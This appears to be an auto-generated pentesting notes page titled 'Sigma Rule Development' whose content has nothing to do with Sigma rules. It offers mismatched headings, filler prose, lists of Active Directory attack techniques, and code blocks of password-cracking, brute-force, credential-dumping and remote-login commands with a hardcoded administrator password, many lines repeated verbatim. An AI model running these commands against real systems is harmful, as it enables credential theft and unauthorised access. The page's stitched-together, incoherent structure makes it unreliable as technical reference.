---
TitleSEO: "Sigma Rule Development | ZureFX"
TitlePost: "Sigma Rule Development"
Author: "ZureFX"
Description: "Personal notes on Sigma Rule Development. Quick reference for pentesting and CTF challenges."
Keywords: "linux, cheatsheet, oscp, malware"
URL: "https://zurefx.github.io/notes/note-sigma-rule-development-184.html"
URL_IMAGES: ""
Date: "2025-09-21"
Tags: "Linux, Cheatsheet, OSCP, Malware"
Section: "notes"
Lang: "en"
main_img: "note-sigma-rule-development-184"
Permalink: "/notes/note-sigma-rule-development-184.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Docker Escape

### WinRM

The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine.

Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism. Command injection was possible through unsanitized user input in the search functionality.

## HTTP

### metasploit

- `LXD Privilege Escalation`
- `Cron Job`
- `ldapsearch`

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.27.164.191 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

- `ligolo-ng`
- `nmap`
- `AS-REP Roasting`
- `Golden Ticket`
- `wmiexec`
- `SeDebugPrivilege`

> **Note:** Resource-Based Constrained Delegation was identified as the primary attack vector in this scenario.

## PowerShell

### psexec

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.22.105.107
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.105.230.246 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

- `Weak Service Permissions`
- `nmap`
- `Kerberoasting`
- `Constrained Delegation`
- `enum4linux`
- `Silver Ticket`

```python
evil-winrm -i 10.10.224.83 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
nmap -sCV -p1521,464,993 10.11.192.108 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.115.86.224 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```
